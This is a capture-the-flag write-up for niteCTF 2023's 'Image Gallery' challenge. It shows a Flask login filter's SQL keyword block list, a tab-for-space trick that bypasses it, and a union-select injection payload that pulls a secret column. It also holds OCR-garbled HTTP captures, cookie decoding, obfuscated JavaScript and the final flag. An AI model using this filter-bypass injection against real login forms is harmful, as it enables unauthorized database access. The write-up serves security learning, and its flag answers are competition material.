# Image Gallery
> View your photo gallery using our super Secure image gallery. we offer free 1 terabyte of storage of high-Quality images, showcased in a personalized custom aLbum.

## About the Challenge
We were given a website and a source code (You can download the source code [here](imagegal.zip)). This website only has 1 functionality which is login user


[Image extracted text: Login
Username:
Password:
Login
niteCTF
2023]


## How to Solve?
If we analyze the source code, it looks like the website is vulnerable to SQL injection but there are a lot of filter here

```python
@app.route("/login", methods=["POST", "GET"])
def login():
    if "logged_in" in session and session["logged_in"]:
        session.pop("logged_in", None)
        return redirect(url_for("login"))

    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        loweruser = username.lower()
        lowerpass = password.lower()
        invalid_entries = invalid_entries = [
            "=", "<", ">", "+", "//", "|", ";", " ", " ", "'1", " 1", " true", "'true", " or", "'or", "/or", " and", "'and", "/and", "'like", " like", "/like", "'where", " where", "/where", "%00", "null", "admin'",
        ]
```

But we can bypass it using `tab` instead of `space`


[Image extracted text: Request
Response
Pretty
Raw
Hex
0
In
=
Pretty
Raw
Hex
Render
In
POST /login
HTTP/2|
HTTP/2
302
Found
2
Host:
imgy-gal.nitectf
live
2
Date:
Tue ,
19
Dec
2023
09:18: 27
GMT
3
Content-Length:
28
3 Content-Type:
text/html;
charset-utf-8
Origin:
https: / /imgy-gal nitectf_
live
Cache-Control:
no-store,
no-cache,
must-revalidate,
max-age-0
5 Content-Type
application/X-WWW-form-urlencoded
5
Expires
~1
6
User-Agent:
Mozilla/5 .0
(Windows
NT
10.0;
Win64;
X64)
6
Location:
Iprofile
AppleWebKit/537.36
(KHTML ,
like
Gecko)
Chrome/120.0.6099.71
Pragma
no-cache
Safari/537
36
8
Set-Cookie:
session=
Accept:
eyJsbzdnZWRfaW4iOnRydWUsInNLY3JLdCI6InNlY3JldEEiLCJlcZVybmFtZSI6I
text/html,application/xhtml+xml,application/xml;q-0.9, image/avif,
idcdGgyXHQxLSOifQ.ZYFf4w.GqQpSSgiAktphInZV4vbrZMM2_k;
Httponly;
image/webp, image/apng,*/*;9=0.8,application/signed-exchange;v=b3;
Path-/
q=0.7
Strict-Transport-Security: max-age-63072000
Referer:
https: / /imgy-gal nitectf.live/login?
10 Vary:
Cookie
Accept-Encoding:
gzip,
deflate
br
11
X-Vercel-Cache:
MISS
10 Accept-Language
en-US, en;q=0.9
12
X-Vercel-Id:
hkgl:
iadl:
5d9fd-1702977507114-bfab8a968b67
11
Priority:
u=0,
13
Cf-Cache-Status
DYNAMIC
12
14
Report-To:
13
username=
or
1--&password-d
{"endpoints" : [{"url":"https
VA/a.nel.cloudflare. com|/ report|/v3?
5=17C59yXTZasp%2F%2FgipyAWd%2B%2BABERXVA44PizcFyiEMISZvlcK3fw9zSg
ZzDKSjdm45EEMZRDVtoqkbhEzRDbfTJSOggY FUObm7JI6dwjaA%2B2FBCRtuarOm
9jd2KCACEGX6pGHczUdDs%3D"}]
group
cf-nel" , "max_
604800}
15
Nel:
{"success_
fraction" :0 _
report_to":"cf-nel"
'max_age" : 604800}
16
Server:
cloudflare
17 Cf-Ray:
837e8eeb5a5207ae-HKG
18
Alt-Svc:
h3-":443"
ma=86400
19
20 < !doctype
htmlz>
21
<html
lang-en>
22
<title>
Redirecting
~</title>
23
<hl>
Redirecting _
</hl>
24
<p>
You
should
be
redirected
automat
ically
to
the
target
URL:
<a
href=" /profile">
Iprofile
<la>
If
not ,
click
the
link_
25
Search
highlights
Search
highlights
age"]


But the flag is not found in the dashboard. If you analyze the sql file, there's a column called `secret`, and to get the secret value im using this payload

```
'	union	select	secret	from	login_details	where	password	like	"%"--
```


[Image extracted text: Request
Response
Pretty
Raw
Hex
51
In
=
Pretty
Raw
Hex
Render
51
In
=
POST /login
HTTP/2
HTTP/2
302
Found
2
Host:
imgy-gal nitectf.live
Date:
Tue,
19
Dec
2023
09:23:24
GMT
3 Content-Length:
86
3 Content-Type:
text/html;
charset-utf-8
Origin:
https: / / imgy-gal nitectf
live
Cache-Control:
no-store,
no-cache,
must-revalidate,
max-age-0
5 Content-Type
application/X-WWW-form-urlencoded
5
Expires:
-1
6
User-Agent:
Mozilla/5 .0
Windows
NT
10.0;
Win64;
X64)
6
Location:
Iprofile
AppleWebKit
537
36
(KHTML,
like
Gecko)
Chrome/120.0.6099.71
Pragma
no-cache
Safari/537
36
Set-Cookie:
session=
Accept:
eJyNVcuSmzgu_
RdXTcOmSSEB6XFZMTYYaESDeVgqV3UZRPMSADGADUZNv4-wnbTT
text/html,application/xhtml-xml,application/xml;q=0.9, image/avif ,
i_SsQPcenfvqodU_MgakaUKf83r2rTuekk-ZNomPSTfZNKSGI4u OLdzq_
dHHaBcb
image/webp
image/apng,*/*;q-0.8,application/ signed-exchange;v=b3;
_Xa lWNF_
6qXh22gGPMvHFRFmlrrRZNHFRPItjvEYC7sNTZuRbchwfzifxKF_
FExTj
q=0 _
gEbMIGaOPWNfVELEVNtkSKtYzpGmlxGGd6fs6JFox44IHyrKKhXFCNvUZS9mKtsgL
Referer:
https: /
imgy-gal nitectf. live/ login?
WCPfrZXZcSFbhDGiZjua2g3irpSMNeUGJRlo8BX-dkyViCDpXLFQZqVbgxa4SEqmM
Accept-Encoding
gzip,
deflate,
br
EufpwRZpswg7ZiqrLATCIRHdIbnjs6Aj2ktHfNqAMg4al_
HZiSpTLilAoVsgaDX8X
10 Accept-Language
en-US, en;q-0.9
7by8vA4A4TdNEZvqEMPAiGqnuc
JXC4k28MHczPlphgMcZHFNWKbUBZMdbLSgGiWil
11 Priority:
u=0 ,
eU_2fM3JSvnHs087T7Pad1430-4CyFGyf4IHZIw8EPYZv6LXb8Uez-ximZw297KeH
12
h2kv7w17619ja6qPYSZvsLLchq65-VKIxFdAozKgaOQWuJ8kaWBSXQbYfOxatEdOv
13
username=
union
select
secret
from
login_details
where
2IyEJLOCtoZXwbhXKDXf22FZILVTbzfpwfs6OYaqgGF6zVnTB3vJCqZTqdYRhOGFP
password
like
"%"_~&password-d
TUyxAWIYcr3zo_
iGuSCAYQGp73w8sWzK_XHIFAcTvgTSjsjblwYYERBUSguHBdM
tlOnxzlaSRYMBaHyg2vScFFmyFPdBKHfQ3PhGPYIovIMOXTaV84PULdGvc881JHZy
W6B4iKN24fZFoPrxyWz2pghwP7OHe93YHXYZyYdJVboski
PFScyJ5_Pz_D6_9GjJ
MfxcQ3C3hwnvcgkY8lJgLbv54_
~qlfcuvOvPmgKqzt9mFJRf6ZDyo_
~Wk-OSMvLw
Gcdy66IoDxGsGfhQNsIxj_
O6wfzolmi8LMQwd28WtzigJeeAZL8LhEPRMbIZmiFaq
6q35UaLZRGTMWMoTKXrZDOQtV4SWolKBBOdhbl7Kq_iv2qUbgHnuFWkQ-AWFgyft
KXbslyl3ALAURODxujbEckMbnrZgwnctBdD4XbbXruCuKMSbyTZp3hetgmsgBGUM
XWIMSxotMcdiyVJptg-R6SoTNpMZa ePocNzjXtU6MBigGsckileLvyg7aWi7QUs8
NVq419wgrXkoG91dkHZmoQGuvCPJbSXhutDWYqBNeEktMGUD ffQgVIb_NTmL7rj92
cgWxfElXSdgcugtPictMX3OrnsbaZ7OLOn-ZAV-LvTIZ8FrcKSeU7Di_Ml8tb4213
ysqsagmcjAd3T810i-S_d36gJifpow2GxhgvZmXZandrkWO-rhD-0f-66U5039a5r
ESbE3fSd3s1d93Jsql3HngW8fqzJt8gZu-VOWXJMdtlh3zbnSkiSPy_Sejf7Yzf7_
Hn273_Ot4nN _
ZYFhDA._k_lFicHHW3uFHEpIco Rbl6aSA;
HttpOnly;
Path-/
Strict-Transport-Security
max-age-63072000
10 Vary=
Cookie
11
X-Vercel-Cache:
MISS
12
X-Vercel-Id:
hkg1:
iadl:
kc5p6-1702977804222-f01977d0df98
13
Cf-Cache-Status
DYNAMIC
14
Report-To]


Ummm, the cookie value suddenly become so big. Decode it using `flask-unsign` and we got this base64 value

```
eyJmbGFnIjoibml0ZXtpc190aGlzX3RoZV9mbGFnP30iLCJuYW1lIjoiVHJ5IGFuZCBnZXQgdGhlIGZsYWchIiwiZGVzYyI6IihmdW5jdGlvbihfMHhkOGZiZGIsXzB4MjQyNDgzKXt2YXIgXzB4NTVkYzdjPV8weDNlN2QsXzB4M2FlZmExPV8weGQ4ZmJkYigpO3doaWxlKCEhW10pe3RyeXt2YXIgXzB4M2Q3ODQ3PS1wYXJzZUludChfMHg1NWRjN2MoMHg5MikpLzB4MSoocGFyc2VJbnQoXzB4NTVkYzdjKDB4OTYpKS8weDIpK3BhcnNlSW50KF8weDU1ZGM3YygweDhlKSkvMHgzKigtcGFyc2VJbnQoXzB4NTVkYzdjKDB4OTMpKS8weDQpK3BhcnNlSW50KF8weDU1ZGM3YygweDk0KSkvMHg1K3BhcnNlSW50KF8weDU1ZGM3YygweDhmKSkvMHg2KigtcGFyc2VJbnQoXzB4NTVkYzdjKDB4OGIpKS8weDcpK3BhcnNlSW50KF8weDU1ZGM3YygweDkxKSkvMHg4Ky1wYXJzZUludChfMHg1NWRjN2MoMHg4YykpLzB4OSoocGFyc2VJbnQoXzB4NTVkYzdjKDB4OTUpKS8weGEpK3BhcnNlSW50KF8weDU1ZGM3YygweDkwKSkvMHhiO2lmKF8weDNkNzg0Nz09PV8weDI0MjQ4MylicmVhaztlbHNlIF8weDNhZWZhMVsncHVzaCddKF8weDNhZWZhMVsnc2hpZnQnXSgpKTt9Y2F0Y2goXzB4NGIyODljKXtfMHgzYWVmYTFbJ3B1c2gnXShfMHgzYWVmYTFbJ3NoaWZ0J10oKSk7fX19KF8weDQ0ZTcsMHhiNGJmMSkpO2Z1bmN0aW9uIF8weDNlN2QoXzB4M2JjYTMzLF8weDIxZjY0OCl7dmFyIF8weDQ0ZTc3Yz1fMHg0NGU3KCk7cmV0dXJuIF8weDNlN2Q9ZnVuY3Rpb24oXzB4M2U3ZGU2LF8weDMxZmViYyl7XzB4M2U3ZGU2PV8weDNlN2RlNi0weDhiO3ZhciBfMHg1ZTU4NTA9XzB4NDRlNzdjW18weDNlN2RlNl07cmV0dXJuIF8weDVlNTg1MDt9LF8weDNlN2QoXzB4M2JjYTMzLF8weDIxZjY0OCk7fWZ1bmN0aW9uIHd1dF9pc190aGlzX25vdygpe3ZhciBfMHg1OTQ5NTY9XzB4M2U3ZDtjb25zb2xlWydsb2cnXShfMHg1OTQ5NTYoMHg4ZCkpO31mdW5jdGlvbiBfMHg0NGU3KCl7dmFyIF8weDQ1ZDA4ZT1bJzlsbENnTm8nLCdhSFIwY0hNNkx5OW5hWFJvZFdJdVkyOXRMMmx6YUdGdUxYTjFjbUZ1WVM5amFHRnNiR1Z1WjJVdicsJzkyNG9mb3BKQicsJzE1NzA5OHR0REd2YScsJzI0MjU3Mjc3YW1kc2RZJywnNDY1NzY4MFdhaWNKRCcsJzh4SHRxc2QnLCcxNjI1Mld6cWZjcycsJzExOTg3OTVlVUFmSUQnLCc0MDI1MTEwR1hveWJNJywnNzk2ODJRU254c1MnLCc4NHhCSnNzdyddO18weDQ0ZTc9ZnVuY3Rpb24oKXtyZXR1cm4gXzB4NDVkMDhlO307cmV0dXJuIF8weDQ0ZTcoKTt9IiwiaWF0IjoxNTE2MjM5MDIyfQ
```

Decode it and you will got a obfuscated javascript code


[Image extracted text: Recipe
Input
ludChfMHgINWRjNZMOMHgSMikpLzBAMSoocGFyc2VJbnQoXzBANTVkYzdjKDBAOTYpKS8weDIpK3BhcnNL
From Base64
SWSOKF8weDUIZGM3YygweDh KSkvMHgzKigtcGFyc2VJbnQoXzBANTVkYzdjKDBAOTMpKS8weDQpK3Bhcn
NZSWSOKF8weDUIZGM3YygweDkOKSkvMHg1KZBhcnNLSWSOKF8weDUIZGM3YygweDhmKSkvMHg2KigtcGFy
Alphabet
A-Za-z0-9+/=
cZVJbnQoXzBANTVkYzdjKDBAOGIpKS8weDcpK3BhcnNZSWSOKFSweDUIZGM3YygweDkxKSkvMHg4KylwYX
JzZUludChfMHgINWRjNZMOMHg4YykpLzBAOSoocGFyc2VJbnQoXzBANTVkYzdjKDBAOTUpKS8weGEpK3Bh
cnNZSWSOKF8weDULZGM3YygweDkwKSkvMHhi02 LmKF8weDNkNZgONZOgPV8weDIOMjQ4MylicmVhazt bH
Remove non-alphabet chars
Strict mode
NZIFSweDNhZWZhMVsncHVzaCddKFSweDNhZWZhMVsnczhpZnQnXSgpKTtgY2FOYZgoXzBANGIyODljKXtf
MHgzYWVmYTFbJ3BIcZgnXShfMHgzYWVmYTFbJ3NoaWZOJ1OoKSk7fX19KF8weDQOZTcsMHhiNGJmMSkpo2
ZlbmNOaWguIF8weDNZNZQoXzB4M2J j YTMzLFSweDIxZj YOOC 7dmFyIF8weDQOZTc3Yz1fMHgONGU3KCk7
cmVOdXJuIFSweDNTNZQ9ZnVuY3Rpb24oXzBAM2U3ZGUZLFSweDMxZmViYyLZXzBAM2U3ZGUZPVBweDNLNZ
RWiOweDhiO3ZhciBfMHgLZTUANTAGXZBANDR WNzdjWI8weDNUNZRZNLO7cmVOdXJuIFSweDVITglMDt9
LF8weDNLNZQoXzB4M2J j YTMZLFSweDIxZjYOOCk7 fWZIbmNOaWguIHdldF9pcl90aGlzX2Svdygpe3zhci
BfMHg1OTQSNTYIXZB4MZUBZDtjb2SzbzxZWydsbzcnXShfMHgLOTQSNTYoMHg4ZCkp03lmdW5jdGlvbiBf
MHgONGU3KCL7dmFyIFSweDQLZDAAZTIbJzLsbENn Tm8nLCdhSFIwYOhNNkxSOWShWFJvZFdJdVkyOXRMMm
YGVildGdllyVTiFihli7 WllMGamFHRnNiR1Z1Wi JldicclzkuMGAmh?RKOicc 1-FIN-AGOHRGRFd)vCcc 1zta
AbC
1726
5
1155
TT
Raw
Bytes
LF
Output
1"Tlag-
nteils_
Tnis
tne_Tlag{}"
name
Try
ana
get
tne
Tlag
aesc
function(_Oxd8fbdb,
0x242483) {var
Ox5Sdc7c-_Ox3e7d,_Ox3aefal-_Oxd8fbdb( ) ;while( !
[]) {try{var
0x3d7847=-
parseInt(_Ox55dc7c(0x92) ) /Oxl*
(parseInt(_Ox5Sdc7c(0x96) ) /0x2)+parseInt(_Ox5Sdc7c(Ox8e) ) /Ox3*( -
parseInt(_Ox5Sdc7c(0x93) ) /0x4)+parseInt(_Ox5Sdc7c(0x94) ) /OxS+parseInt(_Ox5Sdc7c(Ox
8f) ) /Ox6*(-parseInt (_Ox5Sdc7c(Ox8b) ) /0x7)+parseInt(_Ox5Sdc7c(0x91) ) /0x8+-
parseInt(_Ox5Sdc7c(Ox8c) ) /Oxgx
(parseInt(_Ox5Sdc7c(0x95) ) /Oxa)+parseInt(_Ox5Sdc7c(0x90) ) /Oxb; if(_0x3d7847===
0x24
2483) break;else
Ox3aefal [ 'push' ] (_OxBaefal [ ' shift' ] ( ) ) ;}catch(_0x4b289c)
{_Ox3aefal [ 'push ' ] (_Ox3aefal[ ' shift' ] () ) ;}}}(_0x44e7,Oxb4bf1) ) ;function
Ox3e7d(_Ox3bca33,_0x21f648) {var _0x44e77c-_0x44e7( ) ; return
Ox3e7d-function(_Ox3e7de6,_Ox31febc) {_Ox3e7de6-_Ox3e7de6-Ox8b;var
0x5e5850-_0x44e77c [_Ox3e7de6]; return
STFP
BAKEI
Ox5e5850: }
Ox3el7d (
Ox3bca33
Ox21f648) : }function
is
this
nowi]


Deobfuscate the JS, and there's a github link that contains the flag


[Image extracted text: ishan-surana commented last
ssignees
ishan-surana edited last week
one assio
Bro you closed my issue without
No flag for you
habels
Not just me, even others cannot see the flag across any branches
one
yet
ishan-surana commented last m
He deleted the edit but
remember the flag, it was nite{k33ping_up_WIth_the_time5}
rrojects
No flag for you
None
Milestone
No milestone
ishan-surana commented last month
edited
Owner
Author
Edited 10 times
Developmen
Yeah same
even
No branches
ishan-surana edited last week (most re .
Is there any way for
ishan-surana edited last week
Notifications
ishan-surana edited last week
You're not re
ishan-surana comme
ishan-surana edited last week
Owner
Author
ishan-surana edited last week
Bro you closed my
ceptable
participant
ishan-surana edited last week
Yeah same:
even
dc
ishan-surana edited last month
yet]


```
nite{k33ping_up_w1th_+he_time5}
```